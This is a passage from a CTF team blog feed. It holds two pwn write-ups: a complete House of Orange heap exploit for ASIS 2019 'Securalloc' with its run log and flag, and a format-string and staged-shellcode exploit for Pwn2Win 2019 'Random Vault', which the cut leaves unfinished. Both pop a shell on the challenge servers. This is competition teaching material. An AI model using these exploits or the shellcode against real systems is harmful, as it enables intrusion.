class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">host, port = <span class="string">"76.74.177.238"</span>, <span class="string">"9001"</span></span><br><span class="line">filename = <span class="string">"./securalloc.elf"</span></span><br><span class="line">elf = ELF(filename)</span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> args.REMOTE:</span><br><span class="line">    libc = elf.libc <span class="comment"># get a docker container that runs libc-2.23 or LD_PRELOAD</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getConn</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> process(filename) <span class="keyword">if</span> <span class="keyword">not</span> args.REMOTE <span class="keyword">else</span> remote(host, port)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_PIE</span><span class="params">(proc)</span>:</span></span><br><span class="line">    memory_map = open(<span class="string">"/proc/&#123;&#125;/maps"</span>.format(proc.pid),<span class="string">"rb"</span>).readlines()</span><br><span class="line">    <span class="keyword">return</span> int(memory_map[<span class="number">0</span>].split(<span class="string">"-"</span>)[<span class="number">0</span>],<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_LIBC</span><span class="params">(proc)</span>:</span></span><br><span class="line">    memory_map = open(<span class="string">"/proc/&#123;&#125;/maps"</span>.format(proc.pid),<span class="string">"rb"</span>).readlines()</span><br><span class="line">    <span class="keyword">return</span> int(memory_map[<span class="number">4</span>].split(<span class="string">"-"</span>)[<span class="number">0</span>],<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_LIBALLOC</span><span class="params">(proc)</span>:</span></span><br><span class="line">    memory_map = open(<span class="string">"/proc/&#123;&#125;/maps"</span>.format(proc.pid),<span class="string">"rb"</span>).readlines()</span><br><span class="line">    <span class="keyword">return</span> int(memory_map[<span class="number">9</span>].split(<span class="string">"-"</span>)[<span class="number">0</span>],<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(bp, labp=[])</span>:</span></span><br><span class="line">    script = <span class="string">""</span></span><br><span class="line">    PIE = get_PIE(r)</span><br><span class="line">    LIBALLOC = get_LIBALLOC(r)</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> bp:</span><br><span class="line">        script += <span class="string">"b *0x%x\n"</span>%(PIE+x)</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> labp:</span><br><span class="line">        script += <span class="string">"b *0x%x\n"</span>%(LIBALLOC+x)</span><br><span class="line">    gdb.attach(r,gdbscript=script)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">'==========\n&gt; '</span>, <span class="string">'1'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'Size: '</span>, str(size))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(data)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">'==========\n&gt; '</span>, <span class="string">'2'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'Data: '</span>, data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">'==========\n&gt; '</span>, <span class="string">'3'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">()</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">'==========\n&gt; '</span>, <span class="string">'4'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'new-window'</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">global</span> r</span><br><span class="line">        r = getConn()</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># leak libc and heap (_IO_2_1_stderr)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> args.REMOTE <span class="keyword">and</span> args.GDB:</span><br><span class="line">            debug([<span class="number">0xBFF</span>,<span class="number">0xC67</span>,<span class="number">0xC7D</span>,<span class="number">0xC39</span>,<span class="number">0xD45</span>,<span class="number">0xB6E</span>], [<span class="number">0xA0B</span>])</span><br><span class="line">        add(<span class="number">0x60</span>)</span><br><span class="line">        delete()</span><br><span class="line">        add(<span class="number">0x30</span>)</span><br><span class="line"></span><br><span class="line">        show()</span><br><span class="line">        r.recvuntil(<span class="string">'Data: '</span>)</span><br><span class="line">        HEAPADDR = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">0x8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">        HEAP = HEAPADDR - <span class="number">0xf0</span></span><br><span class="line">        log.info(<span class="string">"HEAPADDR 0x%x"</span> % HEAPADDR)</span><br><span class="line">        log.info(<span class="string">"HEAP 0x%x"</span> % HEAP)</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">        add(<span class="number">0x10</span>)</span><br><span class="line">        show()</span><br><span class="line">        r.recvuntil(<span class="string">'Data: '</span>)</span><br><span class="line">        IOFILEJUMPS = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">0x8</span>,<span class="string">'\x00'</span>)) <span class="comment"># _IO_file_jumps</span></span><br><span class="line"></span><br><span class="line">        LIBC = IOFILEJUMPS - libc.symbols[<span class="string">'_IO_file_jumps'</span>]</span><br><span class="line">        _IO_LIST_ALL = LIBC + libc.symbols[<span class="string">'_IO_list_all'</span>]</span><br><span class="line">        SYSTEM = LIBC + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">        log.info(<span class="string">"IO_file_jumps 0x%x"</span> % IOFILEJUMPS)</span><br><span class="line">        log.info(<span class="string">"LIBC 0x%x"</span> % LIBC)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># leak heap canary (/dev/urandom buffer)</span></span><br><span class="line">        add(<span class="number">0x140</span>)</span><br><span class="line">        add(<span class="number">0x8</span>)</span><br><span class="line">        show()</span><br><span class="line">        HEAPCANARY = u64(r.recvline().rstrip()[<span class="number">-7</span>::].rjust(<span class="number">0x8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">        log.info(<span class="string">"HEAPCANARY 0x%x"</span> % HEAPCANARY)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 3) HOUSE OF ORANGE</span></span><br><span class="line">        </span><br><span class="line">        add(<span class="number">0x3e0</span>) <span class="comment"># fastbin(0x80) goes to a smallbin because allocation is &gt; 1000 (0x3e0+0x10 = 1008)</span></span><br><span class="line">        payload = p64(HEAPCANARY)</span><br><span class="line">        payload += <span class="string">"/bin/sh\x00"</span></span><br><span class="line">        payload += p64(<span class="number">0x61</span>) <span class="comment">#size</span></span><br><span class="line">        payload += p64(<span class="number">0xdeadbeef</span>) <span class="comment"># FD</span></span><br><span class="line">        payload += p64(_IO_LIST_ALL<span class="number">-0x10</span>) <span class="comment"># BK</span></span><br><span class="line">        payload += p64(<span class="number">0</span>) + p64(<span class="number">1</span>) <span class="comment">#_IO_write_base &lt; _IO_write_ptr</span></span><br><span class="line">        payload += p64(<span class="number">0</span>) * <span class="number">18</span> <span class="comment"># unused</span></span><br><span class="line">        payload += p64(<span class="number">0</span>) <span class="comment"># fp-&gt;_mode &lt;= 0</span></span><br><span class="line">        payload += p64(<span class="number">0</span>) * <span class="number">2</span> <span class="comment"># unused</span></span><br><span class="line">        payload += p64(HEAP+<span class="number">0x100</span>) <span class="comment"># VTABLE ADDRESS</span></span><br><span class="line">        payload += p64(<span class="number">0</span>) * <span class="number">3</span> <span class="comment">#VTABLE</span></span><br><span class="line">        payload += p64(SYSTEM)</span><br><span class="line">        add(<span class="number">0x0</span>)</span><br><span class="line">        edit(payload)</span><br><span class="line">        add(<span class="number">0x10</span>)</span><br><span class="line">        r.recvuntil(<span class="string">'[vdso]\n'</span>)</span><br><span class="line">        r.sendline(<span class="string">'ls -ltah'</span>) <span class="comment"># send ls command</span></span><br><span class="line">        r.recvline_regex(<span class="string">r'\d\d:\d\d\s\.'</span>) <span class="comment"># to check if ls ran succefully</span></span><br><span class="line">        r.interactive()</span><br><span class="line">        r.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">    <span class="keyword">except</span> EOFError, KeyboardInterrupt:</span><br><span class="line">        r.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">not</span> exploit():</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>Running it:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">$ python securalloc.py REMOTE</span><br><span class="line">[*] <span class="string">'/ctf/work/pwn/securalloc/securalloc.elf'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">[*] <span class="string">'/ctf/work/pwn/securalloc/libc.so.6'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">[+] Opening connection to 76.74.177.238 on port 9001: Done</span><br><span class="line">[*] HEAPADDR 0x565285b230f0</span><br><span class="line">[*] HEAP 0x565285b23000</span><br><span class="line">[*] IO_file_jumps 0x7f1728c6b6e0</span><br><span class="line">[*] LIBC 0x7f17288a8000</span><br><span class="line">[*] HEAPCANARY 0x1ecb79a1e3203a00</span><br><span class="line">[*] Closed connection to 76.74.177.238 port 9001</span><br><span class="line">[+] Opening connection to 76.74.177.238 on port 9001: Done</span><br><span class="line">[*] HEAPADDR 0x5643a10cb0f0</span><br><span class="line">[*] HEAP 0x5643a10cb000</span><br><span class="line">[*] IO_file_jumps 0x7fde0d99b6e0</span><br><span class="line">[*] LIBC 0x7fde0d5d8000</span><br><span class="line">[*] HEAPCANARY 0x816203195eb4af00</span><br><span class="line">[*] Closed connection to 76.74.177.238 port 9001</span><br><span class="line">[+] Opening connection to 76.74.177.238 on port 9001: Done</span><br><span class="line">[*] HEAPADDR 0x55e2209950f0</span><br><span class="line">[*] HEAP 0x55e220995000</span><br><span class="line">[*] IO_file_jumps 0x7effb1b836e0</span><br><span class="line">[*] LIBC 0x7effb17c0000</span><br><span class="line">[*] HEAPCANARY 0xda7a7dfc7356dd00</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">drwxr-xr-x 1 root root 4.0K Nov 13 12:35 ..</span><br><span class="line">-r--r----- 1 root pwn    33 Aug 22 10:26 flag.txt</span><br><span class="line">-r-xr-x--- 1 root pwn   10K Aug 22 09:08 chall</span><br><span class="line">-r-xr-x--- 1 root pwn    37 Aug 22 05:02 redir.sh</span><br><span class="line">$ cat flag.txt</span><br><span class="line">ASIS&#123;l3ft0v3r_ru1n3d_3v3ryth1ng&#125;</span><br></pre></td></tr></table></figure></p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Securalloc&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Points&lt;/strong&gt;&lt;br&gt;167&lt;br&gt;&lt;strong&gt;Solves&lt;/strong&gt;&lt;br&gt;26&lt;br&gt;&lt;strong&gt;Category&lt;/stro
      
    
    </summary>
    
      <category term="Pwn" scheme="https://teamrocketist.github.io/categories/Pwn/"/>
    
      <category term="x64" scheme="https://teamrocketist.github.io/categories/Pwn/x64/"/>
    
      <category term="Glibc Malloc" scheme="https://teamrocketist.github.io/categories/Pwn/x64/Glibc-Malloc/"/>
    
      <category term="IO_FILE" scheme="https://teamrocketist.github.io/categories/Pwn/x64/Glibc-Malloc/IO-FILE/"/>
    
      <category term="House of Orange" scheme="https://teamrocketist.github.io/categories/Pwn/x64/Glibc-Malloc/House-of-Orange/"/>
    
    
      <category term="io_file" scheme="https://teamrocketist.github.io/tags/io-file/"/>
    
      <category term="io_file_struct" scheme="https://teamrocketist.github.io/tags/io-file-struct/"/>
    
      <category term="houseoforange" scheme="https://teamrocketist.github.io/tags/houseoforange/"/>
    
      <category term="asisfinals2019" scheme="https://teamrocketist.github.io/tags/asisfinals2019/"/>
    
  </entry>
  
  <entry>
    <title>[Pwn] Pwn2Win 2019 CTF - Random Vault</title>
    <link href="https://teamrocketist.github.io/2019/11/11/Pwn-Pwn2Win-2019-CTF-Random-Vault/"/>
    <id>https://teamrocketist.github.io/2019/11/11/Pwn-Pwn2Win-2019-CTF-Random-Vault/</id>
    <published>2019-11-11T05:44:54.000Z</published>
    <updated>2022-08-23T00:14:55.165Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p><strong>Random Vault</strong> </p><p><em>303 points</em></p></blockquote><blockquote><p><strong>Description</strong>:</p><p>While analysing data obtained through our cyber operations, our analysts have discovered an old service in HARPA<br>infrastructure. This service has been used to store the agency’s secrets, but it has been replaced by a more<br>sophisticated one after a few years. By mistake, this service remained available on Internet until December 2019,<br>when HARPA agents realized this flaw and took it down. We suspect this service is vulnerable. We need your help to<br>exploit its vulnerability and extract the secrets that are still kept on the server.<br><a href="https://mega.nz/#!ayxQWahC!kU-uq0KKqrnoXfAr9MINEPn_dSbSnGn3AF1KjyWBfGU" target="_blank" rel="noopener">random_vault</a></p></blockquote><h3 id="Fast-Solution"><a href="#Fast-Solution" class="headerlink" title="Fast Solution"></a>Fast Solution</h3><ol><li>Use 1st format string to leak pie address</li><li>Use 2nd format string to modify Seed and QWORD_5000 to shellcode place.</li><li>Use shell codes jumps to manage to execute read syscall and write shellcode from the stdin.</li></ol><h3 id="Identifying-the-vulnerability"><a href="#Identifying-the-vulnerability" class="headerlink" title="Identifying the vulnerability"></a>Identifying the vulnerability</h3><p>First thing to do is the check the security settings enabled:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ checksec random_vault</span><br><span class="line">[*] <span class="string">'/ctf/pwn/RandomVault/random_vault'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p><strong>Full RELRO</strong> is enabled so the global offset table is <strong>read only</strong> which is a thing we need to take into consideration on this challenge. Also <strong>PIE</strong> is enabled too this means if we require to get an address of a function or a pointer to a specific address of the program we will need to get a leak to calculate the <strong>PIE</strong> base.</p><p>We can easily find a vulnerability in the username field:<br><a data-fancybox="gallery" href="https://i.imgur.com/NW770IY.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/NW770IY.png" alt><br></a><br>Unfortunately we can only use twice, one when the <strong>program starts</strong> and one <strong>username change</strong>:<br><a data-fancybox="gallery" href="https://i.imgur.com/7mMRLW7.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/7mMRLW7.png" alt><br></a></p><p><strong>qword_4020</strong> is set to a very large <strong>negative</strong> number, which prevents us from at every username change to revert the global back to its original value, well <strong>theoretically</strong> is possible but we only have <strong>81 characters</strong> to do it, because of this it’s not possible to do it with 4 <strong>%hn</strong>‘s, instead we could do it with two <strong>%n</strong>‘s but it’s way too many characters to print, this would take hours so this option was <strong>discarded</strong> by me in the beginning.</p><p>Also something interesting happens on the usual function where the <strong>setvbuff</strong> functions are lying in:<br><a data-fancybox="gallery" href="https://i.imgur.com/ZyunV3G.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/ZyunV3G.png" alt><br></a><br><strong>mprotect</strong> is changing the protections settings from a region of memory at <strong>qword_5000</strong> 0x1000 bytes are now <strong>RWX</strong> this means in this region we can <strong>read</strong>, <strong>write</strong> and <strong>execute</strong> code.</p><h3 id="Leaking-pie"><a href="#Leaking-pie" class="headerlink" title="Leaking pie"></a>Leaking pie</h3><p>We have a format string vulnerability right at the start of the program so let’s leak some addresses with:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r.sendlineafter(<span class="string">'Username: '</span>,<span class="string">'%7$lx|%11$lx'</span>)</span><br></pre></td></tr></table></figure><p>An address aligned with the <strong>PIE</strong> base is located at the 11 position the stack, also an address aligned with the stack addresses is located at the 7th but I didn’t require this one for my current solution.</p><p>One thing we could take from the store function:<br><a data-fancybox="gallery" href="https://i.imgur.com/Lf4YR4o.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/Lf4YR4o.png" alt><br></a><br>Store function will <strong>store</strong> pointers from the stdin on <strong>random</strong> locations, which are generated based on a <strong>seed</strong>, we can <strong>control</strong> this seed by using <strong>format string</strong>, knowing those locations on that special memory region <strong>RWX</strong> we can modify <strong>qword_5000</strong> pointer to one of them and <strong>execute</strong> our shellcode.</p><p>Here is a function I wrote in python to calculate the offsets with the <strong>seed 0</strong>:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">indices_with_seed_zero</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">from</span> ctypes <span class="keyword">import</span> cdll</span><br><span class="line">    libc = cdll.LoadLibrary(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line">    libc.srand(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> xrange(<span class="number">7</span>):</span><br><span class="line">        v0 = libc.rand()</span><br><span class="line">        q = ((v0 &gt;&gt; <span class="number">0x38</span>) + v0) &amp; <span class="number">0xff</span> - ((v0 &gt;&gt; <span class="number">0x1F</span>) &gt;&gt; <span class="number">0x18</span>)</span><br><span class="line">        <span class="keyword">print</span> q*<span class="number">8</span></span><br></pre></td></tr></table></figure><p>The output:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ python random_vault.py </span><br><span class="line"><span class="number">824</span></span><br><span class="line"><span class="number">1584</span></span><br><span class="line"><span class="number">840</span></span><br><span class="line"><span class="number">920</span></span><br><span class="line"><span class="number">648</span></span><br><span class="line"><span class="number">2040</span></span><br><span class="line"><span class="number">592</span></span><br></pre></td></tr></table></figure><p>So the locations that we are going to write are:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Index <span class="number">0</span>: PIE_BASE+<span class="number">824</span>+<span class="number">0x5010</span></span><br><span class="line">Index <span class="number">1</span>: PIE_BASE+<span class="number">1584</span>+<span class="number">0x5010</span></span><br><span class="line">Index <span class="number">2</span>: PIE_BASE+<span class="number">840</span>+<span class="number">0x5010</span></span><br><span class="line">Index <span class="number">3</span>: PIE_BASE+<span class="number">920</span>+<span class="number">0x5010</span></span><br><span class="line">Index <span class="number">4</span>: PIE_BASE+<span class="number">648</span>+<span class="number">0x5010</span></span><br><span class="line">Index <span class="number">5</span>: PIE_BASE+<span class="number">2040</span>+<span class="number">0x5010</span></span><br><span class="line">Index <span class="number">6</span>: PIE_BASE+<span class="number">592</span>+<span class="number">0x5010</span></span><br></pre></td></tr></table></figure><p>The format string code used to overwrite <strong>SEED</strong> and <strong>qword_5000</strong>:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">SEED = PIE+<span class="number">0x5008</span></span><br><span class="line">QWORD5000 = PIE+<span class="number">0x5000</span></span><br><span class="line">unk_5010 = PIE+<span class="number">0x5010</span></span><br><span class="line"></span><br><span class="line">LOW_QWORD4020 = unk_5010 &amp; <span class="number">0xf000</span> | <span class="number">0x348</span></span><br><span class="line">payload = <span class="string">'%29$ln'</span> <span class="comment"># Clear SEED</span></span><br><span class="line">payload += <span class="string">'%&#123;&#125;x%30$hn'</span>.format(LOW_QWORD4020)</span><br><span class="line"></span><br><span class="line">s = payload</span><br><span class="line">s += <span class="string">' '</span>*(<span class="number">40</span>-len(payload))</span><br><span class="line">s += p64(SEED)</span><br><span class="line">s += p64(QWORD5000)</span><br></pre></td></tr></table></figure></p><p><strong>Index 0</strong> and <strong>Index 2</strong> are very near to each other! 0x10 byte apart, I used this to my advantage and manage to call a read syscall successfully.</p><p>First on <strong>index 0</strong> I cleared <strong>RDI</strong>  register and jumped to <strong>Index 2</strong>:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">xor edi, edi ; clears rdi (we want to read from STDIN so we need this to be 0)</span><br><span class="line">add rdx, 0x10 ; ads 0x10 to $rdx register which contains the address where we initially jumped</span><br><span class="line">jmp rdx ; jumps to Index 2 shellcode</span><br></pre></td></tr></table></figure><p>Finally we exchange <strong>R11</strong> with <strong>RDX</strong>(size of bytes we want to read) and <strong>R11</strong> with <strong>RSI</strong> (buffer we want to write), luckily <strong>RAX</strong> is already 0 which is the number of <strong>read</strong> sycall on linux at x64 :</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">xchg r11,rdx ; initial value of $r11 is 0x241 so we want this on rdx register </span><br><span class="line">xchg r11,rsi ; old value of $rdx is now at r11 this address is also the address right at the rip instruction</span><br><span class="line">syscall ; read($rdi, $rsi, rdx) with $rax == 0</span><br></pre></td></tr></table></figure><p>The code to this store this shellcode:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">r.sendlineafter(<span class="string">'4. Quit\n\n'</span>,<span class="string">'2'</span>)</span><br><span class="line">r.sendlineafter(<span class="string">': '</span>, str(<span class="number">0xe2ff10c28348ff31</span>)) <span class="comment"># xor edi, edi ; add rdx, 0x10 ; jmp rdx </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">': '</span>, str(<span class="number">0x050ff38749d38749</span>)) <span class="comment"># xchg r11,rdx ; xchg r11,rsi ; syscall</span></span><br></pre></td></tr></table></figure><p>Finally we can read from the <strong>STDIN</strong> the shellcode that will get us a shell:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mov rbx, 0xFF978CD091969DD1</span><br><span class="line">neg rbx</span><br><span class="line">push rbx</span><br><span class="line">xor eax, eax</span><br><span class="line">cdq</span><br><span class="line">xor esi, esi</span><br><span class="line">push rsp</span><br><span class="line">pop rdi</span><br><span class="line">mov al, 0x3b  ; sys_execve</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><p>Sending data from the stdin:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rip = p64(<span class="number">0x050ff38749d38749</span>) <span class="comment"># needs to be the code at #rip otherwise we get a segfault</span></span><br><span class="line">shellcode = <span class="string">'\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x31\xc0\x99\x31\xf6\x54\x5f\xb0\x3b\x0f\x05'</span></span><br><span class="line">r.sendline(rip+shellcode)</span><br></pre></td></tr></table></figure><p>The full exploit code:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from libc import time,time_t</span></span><br><span class="line"></span><br><span class="line">host, port = <span class="string">"200.136.252.34"</span>, <span class="string">"1245"</span></span><br><span class="line">filename = <span class="string">"./random_vault"</span></span><br><span class="line">elf = ELF(filename)</span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> 